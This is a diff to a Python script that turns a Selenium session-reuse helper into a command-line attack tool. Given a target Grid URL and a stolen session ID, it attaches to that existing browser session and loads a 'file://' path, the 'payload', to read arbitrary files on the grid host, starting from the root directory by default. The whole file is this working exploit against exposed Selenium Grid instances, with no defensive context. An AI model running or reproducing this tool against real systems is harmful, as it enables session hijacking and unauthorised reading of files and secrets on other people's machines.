@@ -1,6 +1,5 @@
+import argparse
 from selenium import webdriver
-
-grid_url = "http://localhost:4444/wd/hub"
 
 
 def create_driver_session(session_id, executor_url):
@@ -26,6 +25,29 @@ def create_driver_session(session_id, executor_url):
 
     return new_driver
 
+if __name__ == "__main__":
+    Parser = argparse.ArgumentParser()
+    Parser.add_argument('-u', '--url', help='Target URL')
+    Parser.add_argument('-s', '--sessionid', help='Session ID from Selenium Hub session.')
+    Parser.add_argument('-f', '--file', help='File to read')
+    args = Parser.parse_args()
 
-driver_chrome_reuse = create_driver_session("59a366210d1b31db7d89d85f6010ebb1", grid_url)
-driver_chrome_reuse.get("file:///")
+    if args.url is None:
+        print('Specify a URL')
+        Parser.print_help()
+        exit(1)
+
+    if args.sessionid is None:
+        print('Specify a Session ID')
+        Parser.print_help()
+        exit (1)
+
+    if args.file is None:
+        args.file = '/'
+
+    grid_url = args.url
+    sessionid = args.sessionid
+    payload = args.file
+
+    driver_chrome_reuse = create_driver_session(sessionid, grid_url)
+    driver_chrome_reuse.get('file://' + payload)
